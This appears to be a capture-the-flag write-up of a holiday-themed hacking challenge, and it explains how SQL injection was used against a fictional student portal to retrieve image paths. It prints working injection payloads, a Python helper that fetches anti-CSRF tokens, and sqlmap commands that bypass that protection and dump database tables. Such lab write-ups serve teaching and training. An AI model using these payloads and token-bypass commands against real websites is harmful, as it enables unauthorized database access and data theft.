9) Retrieve Scraps of Paper from Server
=======================================
Challenge
---------
Difficulty: 4/5 

Gain access to the data on the Student Portal server and retrieve the paper scraps hosted there. What is the name of Santa's cutting-edge sleigh guidance system? For hints on achieving this objective, please visit the dorm and talk with Pepper Minstix.

Answer
------
**Super Sled-o-matic**

Solution
--------
1. Discovery
^^^^^^^^^^^^
The following dialog with Krampus indicated that we were looking for information about Krampus.

    As for those scraps of paper, I scanned those and put the images on my server.
    I then threw the paper away.
    Unfortunately, I managed to lock out my account on the server.
    Hey! You’ve got some great skills. Would you please hack into my system and retrieve the scans?

We also had the following dialog from Pepper Minstix:

    Have you had any luck retrieving scraps of paper from the Elf U server?
    You might want to look into SQL injection techniques.
    OWASP is always a good resource for web attacks.
    For blind SQLi, I've heard Sqlmap is a great tool.
    In certain circumstances though, you need custom tamper scripts to get things going!

Pepper Minstix also provided with a link to a blog post titled `SQLMap Tamper Scripts for The Win <https://pen-testing.sans.org/blog/2017/10/13/sqlmap-tamper-scripts-for-the-win>`_

The hint from Pepper Minstix was useful because it showed that SQLMap would be helpful for solving the challenge. It also hinted that we may have to perform some customisations with SQLMap to defeat protection mechanisms. 

1.1. Starting artefacts
"""""""""""""""""""""""
* `Student Portal <https://studentportal.elfu.org/>`_

1.2. Initial investigations with Chrome
"""""""""""""""""""""""""""""""""""""""
The student had two pages which accepted user input and could possibly be exploited:

* Apply Now page
* Check Application Status page

1.2.1. Apply Now page
+++++++++++++++++++++
The **Apply Now** page consisted of an application form to study at Elf U with various user submitted fields.

The form has some checks for user input for fields such as the email address. However these checks are client-side and can easily be circumvented by modifying the relevant DOM elements. In this case you can change the ``type="email"`` attribute to ``type="text"``.

The form is submitted using a POST request. Typical form data looked something like:

.. code-block::

    name=1&elfmail=test%40test.com&program=1&phone=1&whyme=1&essay=1&token=MTAxMDQwMTI2MzM2MTU3ODc1MTk3NDEwMTA0MDEyNi4zMzY%3D_MTI5MzMxMzYxNzEwMDgzMjMzMjg0MDQyLjc1Mg%3D%3D

An interesting thing we noticed was that if you submit an application with an identical email field twice, you receive the following error:

.. code-block::

    Error: INSERT INTO applications (name, elfmail, program, phone, whyme, essay, status) VALUES ('1', '1', '1', '1', '1', '1', 'pending') Duplicate entry '1' for key 'elfmail'

The column names in the INSERT statement are the same as the fields used in the above POST request.

If we try injecting some SQL that is illegal, we obtain an error message the the DBMS is MariaDB.

We decided to attempt an inband XPATH injection in the "First Name" input box. The contents of **First Name** should be ``1', '1', 'test@test.com' or updatexml(1,concat(0x7e,(database())),0) or '','1','1','1','pending'); #``. The remaining fields can be anything that passes the client-side filters (e.g. enter something like **test@test.com** for the Email field). The following information is returned showing that the database name is **elfu**

.. code-block::

    Error: INSERT INTO applications (name, elfmail, program, phone, whyme, essay, status) VALUES ('1', '1', 'test@test.com' or updatexml(1,concat(0x7e,(database())),0) or '','1','1','1','pending'); #', 'test@test.com', '1', '1', '1', '1', 'pending')
    XPATH syntax error: '~elfu'

Performing inband injections based on INSERT quickly became tedious and we decided to take a look at the other page.

1.2.2. Check Application Status page
++++++++++++++++++++++++++++++++++++
The **Check Application Status** page consisted of a form with a single Email field from which you could check your application status.

The form was submitted as a GET request. A typical URL looked something like:

.. code-block::

    https://studentportal.elfu.org/application-check.php?elfmail=test%40test.com&token=MTAxMDQwMTE5Mjk2MTU3ODc1MTg2NDEwMTA0MDExOS4yOTY%3D_MTI5MzMxMzUyNjk4ODgzMjMzMjgzODE3LjQ3Mg%3D%3D

The form has some checks for user input for fields such as the email address. However these checks are client-side and can easily be circumvented by modifying the relevant DOM elements. In this case you can change the ``type="email"`` attribute to ``type="text"``.

Peforming an invalid inband injection such as ``';SELECT * FROM applications;#`` returns the following error:

.. code-block::

    Error: SELECT status FROM applications WHERE elfmail = '';SELECT * FROM applications;#';
    You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'SELECT * FROM applications;#'' at line 1

Exploiting a SELECT query to return data is simpler than using an INSERT query so we decided to concentrate our efforts on this page. 

1.2.3. Token protection
+++++++++++++++++++++++
Both pages that we looked at so far employed a token to protect against automated requests. This also made it more difficult to use an automated tool such as SQLMap.

Before any of the forms was submitted, the code would make a request to https://studentportal.elfu.org/validator.php. A token would be returned in the body of the response. This token would then be submitted as one of the fields during form submission.

.. note::
    With this token protection, performing inband SQL injections works because the form would request the appropriate token.

2. Solving the challenge
^^^^^^^^^^^^^^^^^^^^^^^^
2.1. Modifying SQLmap
"""""""""""""""""""""
SQLMap is a open source penetration testing tool written in Python that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.

To use SQLMap with the Student Portal, we needed to find a way to defeat the token protection. The hints described a possible way of doing this was to utilise the tamper functionality and write a custom module. We found the instructions for doing this a bit finicky, and instead chose to use the ``--eval`` option. This option evaluates the provided Python code before each request.

As shown below, we wrote a simple Python script (validate.py) that we placed in the same directory as the SQLMap tool.

.. code-block:: python

    import requests
    def getToken():
        url = 'https://studentportal.elfu.org/validator.php'
        response = requests.get(url)
        token = response.text
        return token

.. note::
    This module has a dependency on the **requests** library which can be installed using something like ``pip install requests``.

To run SQLMap we need to use something like the following:

.. code-block::

    python sqlmap.py -u "https://studentportal.elfu.org/application-check.php?elfmail=test&token=" --eval="import validate;token=validate.getToken()" -v 3

.. note::
    During the automated testing you may get a prompt about 'token' holding a anti-CSRF token. We **do not** want SQLMap to automatically update this token in further requests.

Running the above analysis returns the following as shows that this page is exploitable.

.. code-block::

    sqlmap resumed the following injection point(s) from stored session:
    ---
    Parameter: elfmail (GET)
        Type: boolean-based blind
        Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
        Payload: elfmail=test' OR NOT 9290=9290#&token=
        Vector: OR NOT [INFERENCE]#

        Type: error-based
        Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
        Payload: elfmail=test' OR (SELECT 4443 FROM(SELECT COUNT(*),CONCAT(0x7178717671,(SELECT (ELT(4443=4443,1))),0x7170786271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- XAHQ&token=
        Vector: OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

        Type: time-based blind
        Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
        Payload: elfmail=test' AND (SELECT 8445 FROM (SELECT(SLEEP(5)))EOvD)-- yTjJ&token=
        Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
    ---

2.2. Retrieving the needed information from the database
""""""""""""""""""""""""""""""""""""""""""""""""""""""""
We used the following commands to obtain information about the paper scraps. The output has been truncated to show only information of interest.

2.2.1. List databases
+++++++++++++++++++++
.. code-block::

    python sqlmap.py -u "https://studentportal.elfu.org/application-check.php?elfmail=test&token=" --eval="import validate;token=validate.getToken()" --dbs

    available databases [2]:
    [*] elfu
    [*] information_schema

2.2.2. List tables
++++++++++++++++++
.. code-block::

    python sqlmap.py -u "https://studentportal.elfu.org/application-check.php?elfmail=test&token=" --eval="import validate;token=validate.getToken()" --tables

    Database: elfu
    [3 tables]
    +---------------------------------------+
    | applications                          |
    | krampus                               |
    | students                              |
    +---------------------------------------+

    Database: information_schema
    [78 tables]

2.2.3. Dump the krampus table
+++++++++++++++++++++++++++++
.. code-block::

    python sqlmap.py -u "https://studentportal.elfu.org/application-check.php?elfmail=test&token=" --eval="import validate;token=validate.getToken()" --dump -T krampus

    Database: elfu
    Table: krampus
    [6 entries]
    +----+-----------------------+
    | id | path                  |
    +----+-----------------------+
    | 1  | /krampus/0f5f510e.png |
    | 2  | /krampus/1cc7e121.png |
    | 3  | /krampus/439f15e6.png |
    | 4  | /krampus/667d6896.png |
    | 5  | /krampus/adb798ca.png |
    | 6  | /krampus/ba417715.png |
    +----+-----------------------+

2.3. Reconstructing the paper scraps
""""""""""""""""""""""""""""""""""""
We found information about 6 paper scraps in the previous section. To retrieve the scraps we had to simply append the path to **https://studentportal.elfu.org**

After downloading the images, we pasted them into an image editor and aligned the scraps to form the following document (one piece seems to be missing).

.. image:: /images/o9-scraps.png

The name of Santa's cutting-edge sleigh guidance system is **Super Sled-o-matic**